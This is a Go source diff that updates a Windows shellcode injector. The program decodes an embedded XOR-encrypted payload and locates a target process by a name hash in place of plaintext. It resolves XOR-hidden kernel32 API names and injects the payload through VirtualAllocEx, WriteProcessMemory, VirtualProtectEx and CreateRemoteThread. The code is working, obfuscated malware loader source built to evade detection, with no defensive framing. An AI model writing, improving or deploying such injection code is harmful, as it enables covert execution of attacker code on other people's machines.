@@ -12,7 +12,7 @@ func IsBitSet(x int, pos int) bool {
 	return (x&(1<<pos) != 0)
 }
 
-func MyXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
+func UtilsXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
 	var i uint64 = 0
 	var j uint64 = 0
 
@@ -22,21 +22,21 @@ func MyXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
 		}
 
 		var bInput byte = 0
-		var BitXOR byte = 0
+		var bitXOR byte = 0
 
 		for b := 0; b < 8; b++ {
-			IsDataBitSet := IsBitSet(int((*data)[i]), b)
-			IsKeyBitSet := IsBitSet(int((*key)[j]), b)
+			isDataBitSet := IsBitSet(int((*data)[i]), b)
+			isKeyBitSet := IsBitSet(int((*key)[j]), b)
 
-			XORBit := (IsDataBitSet != IsKeyBitSet)
+			xorBit := (isDataBitSet != isKeyBitSet)
 
-			if XORBit {
-				BitXOR = 1
+			if xorBit {
+				bitXOR = 1
 			} else {
-				BitXOR = 0
+				bitXOR = 0
 			}
 
-			bInput |= BitXOR << b
+			bInput |= bitXOR << b
 		}
 
 		(*data)[i] = bInput
@@ -45,108 +45,176 @@ func MyXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
 	}
 }
 
-func FindTargetProcessID(TargetName string) uint32 {
-	var RetVal uint32 = math.MaxUint32
+func UtilsStrHash(inputString string) (hash uint64) {
 
-	SnapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	inputStringLen := uint64(len(inputString))
+	var i uint64
 
-	if err != nil {
-		panic(err)
-	}
+	for i < inputStringLen {
+		currentFold := uint64(inputString[i])
+		currentFold <<= 8
 
-	ProcessEntry32 := windows.ProcessEntry32{}
-	ProcessEntry32.Size = 568
-
-	err = windows.Process32First(SnapshotHandle, &ProcessEntry32)
-
-	if err != nil {
-		panic(err)
-	}
-
-	err = windows.Process32Next(SnapshotHandle, &ProcessEntry32)
-
-	for err == nil {
-		AreStringsEqual := strings.Compare(TargetName, windows.UTF16ToString(ProcessEntry32.ExeFile[:]))
-
-		if AreStringsEqual == 0 {
-			return ProcessEntry32.ProcessID
+		if i+1 < inputStringLen {
+			currentFold |= uint64(inputString[i+1])
+			currentFold <<= 8
 		}
 
-		err = windows.Process32Next(SnapshotHandle, &ProcessEntry32)
+		if i+2 < inputStringLen {
+			currentFold |= uint64(inputString[i+2])
+			currentFold <<= 8
+		}
+
+		if i+3 < inputStringLen {
+			currentFold |= uint64(inputString[i+3])
+		}
+
+		hash += currentFold
+
+		i += 4
 	}
 
-	windows.CloseHandle(SnapshotHandle)
+	return
+}
 
-	return RetVal
+func FindTargetProcessIDByName(targetName string) uint32 {
+	var retVal uint32 = math.MaxUint32
+
+	snapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+
+	if err != nil {
+		panic(err)
+	}
+
+	processEntry32 := windows.ProcessEntry32{}
+	processEntry32.Size = 568
+
+	err = windows.Process32First(snapshotHandle, &processEntry32)
+
+	if err != nil {
+		panic(err)
+	}
+
+	err = windows.Process32Next(snapshotHandle, &processEntry32)
+
+	for err == nil {
+		AreStringsEqual := strings.Compare(targetName, windows.UTF16ToString(processEntry32.ExeFile[:]))
+
+		if AreStringsEqual == 0 {
+			return processEntry32.ProcessID
+		}
+
+		err = windows.Process32Next(snapshotHandle, &processEntry32)
+	}
+
+	windows.CloseHandle(snapshotHandle)
+
+	return retVal
+}
+
+func FindTargetProcessIDByHash(targetNameHash uint64) uint32 {
+	var retVal uint32 = math.MaxUint32
+
+	snapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+
+	if err != nil {
+		panic(err)
+	}
+
+	processEntry32 := windows.ProcessEntry32{}
+	processEntry32.Size = 568
+
+	err = windows.Process32First(snapshotHandle, &processEntry32)
+
+	if err != nil {
+		panic(err)
+	}
+
+	err = windows.Process32Next(snapshotHandle, &processEntry32)
+
+	for err == nil {
+		hash := UtilsStrHash(windows.UTF16ToString(processEntry32.ExeFile[:]))
+
+		if hash == targetNameHash {
+			return processEntry32.ProcessID
+		}
+
+		err = windows.Process32Next(snapshotHandle, &processEntry32)
+	}
+
+	windows.CloseHandle(snapshotHandle)
+
+	return retVal
 }
 
 //go:embed migrate.x86.bin.xor
 var Payload []byte
 
 func main() {
-	xor_key := []byte{'0', '0', '0', '0', '0'}
-	MyXor(&Payload, uint64(len(Payload)), &xor_key, uint64(len(xor_key)))
+	xorKey := []byte{'0', '0', '0', '0', '0'}
+	UtilsXor(&Payload, uint64(len(Payload)), &xorKey, uint64(len(xorKey)))
 
-	TargetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
-	MyXor(&TargetName, uint64(len(TargetName)), &xor_key, uint64(len(xor_key)))
+	// targetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
+	// UtilsXor(&targetName, uint64(len(targetName)), &xorKey, uint64(len(xorKey)))
 
-	var TargetPID uint32 = math.MaxUint32
+	var targetPID uint32 = math.MaxUint32
 
-	for TargetPID == math.MaxUint32 {
-		TargetPID = FindTargetProcessID(string(TargetName))
+	targetNameHash := uint64(0x144493d93)
 
-		if TargetPID != math.MaxUint32 {
+	for targetPID == math.MaxUint32 {
+		targetPID = FindTargetProcessIDByHash(targetNameHash)
+
+		if targetPID != math.MaxUint32 {
 			break
 		}
 
 		windows.SleepEx(5000, false)
 	}
 
-	TargetProcessHandle, err := windows.OpenProcess(((0x000F0000) | (0x00100000) | 0xFFFF), false, uint32(TargetPID))
+	targetProcessHandle, err := windows.OpenProcess(((0x000F0000) | (0x00100000) | 0xFFFF), false, uint32(targetPID))
 
 	if err != nil {
 		panic(err)
 	}
 
-	Kernel32Str := []byte{0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c}
-	MyXor(&Kernel32Str, uint64(len(Kernel32Str)), &xor_key, uint64(len(xor_key)))
+	kernel32Str := []byte{0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c}
+	UtilsXor(&kernel32Str, uint64(len(kernel32Str)), &xorKey, uint64(len(xorKey)))
 
-	kernel32 := windows.NewLazyDLL(string(Kernel32Str))
+	kernel32 := windows.NewLazyDLL(string(kernel32Str))
 
-	VirtualAllocExStr := []byte{0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48}
-	MyXor(&VirtualAllocExStr, uint64(len(VirtualAllocExStr)), &xor_key, uint64(len(xor_key)))
+	virtualAllocExStr := []byte{0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48}
+	UtilsXor(&virtualAllocExStr, uint64(len(virtualAllocExStr)), &xorKey, uint64(len(xorKey)))
 
-	VirtualAllocEx := kernel32.NewProc(string(VirtualAllocExStr))
+	virtualAllocEx := kernel32.NewProc(string(virtualAllocExStr))
 
-	PayloadMem, _, _ := VirtualAllocEx.Call(uintptr(TargetProcessHandle), 0, uintptr(len(Payload)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+	payloadMem, _, _ := virtualAllocEx.Call(uintptr(targetProcessHandle), 0, uintptr(len(Payload)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
 
-	if PayloadMem == 0 {
+	if payloadMem == 0 {
 		return
 	}
 
-	var BytesWritten uintptr = 0
+	var bytesWritten uintptr = 0
 
-	err = windows.WriteProcessMemory(TargetProcessHandle, PayloadMem, &Payload[0], uintptr(len(Payload)), &BytesWritten)
+	err = windows.WriteProcessMemory(targetProcessHandle, payloadMem, &Payload[0], uintptr(len(Payload)), &bytesWritten)
 	if err != nil {
 		panic(err)
 	}
 
-	var OldProtect uint32 = 0
-	err = windows.VirtualProtectEx(TargetProcessHandle, PayloadMem, uintptr(len(Payload)), windows.PAGE_EXECUTE_READWRITE, &OldProtect)
+	var oldProtect uint32 = 0
+	err = windows.VirtualProtectEx(targetProcessHandle, payloadMem, uintptr(len(Payload)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
 		panic(err)
 	}
 
-	CreateRemoteThreadStr := []byte{0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54}
-	MyXor(&CreateRemoteThreadStr, uint64(len(CreateRemoteThreadStr)), &xor_key, uint64(len(xor_key)))
+	createRemoteThreadStr := []byte{0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54}
+	UtilsXor(&createRemoteThreadStr, uint64(len(createRemoteThreadStr)), &xorKey, uint64(len(xorKey)))
 
-	CreateRemoteThread := kernel32.NewProc(string(CreateRemoteThreadStr))
-	ThreadHandle, _, _ := CreateRemoteThread.Call(uintptr(TargetProcessHandle), 0, 0, PayloadMem, 0, 0, 0)
+	createRemoteThread := kernel32.NewProc(string(createRemoteThreadStr))
+	threadHandle, _, _ := createRemoteThread.Call(uintptr(targetProcessHandle), 0, 0, payloadMem, 0, 0, 0)
 
-	if ThreadHandle != 0 {
-		windows.WaitForSingleObject(windows.Handle(ThreadHandle), windows.INFINITE)
-		windows.CloseHandle(windows.Handle(ThreadHandle))
+	if threadHandle != 0 {
+		windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
+		windows.CloseHandle(windows.Handle(threadHandle))
 	}
 
-	windows.CloseHandle(TargetProcessHandle)
+	windows.CloseHandle(targetProcessHandle)
 }
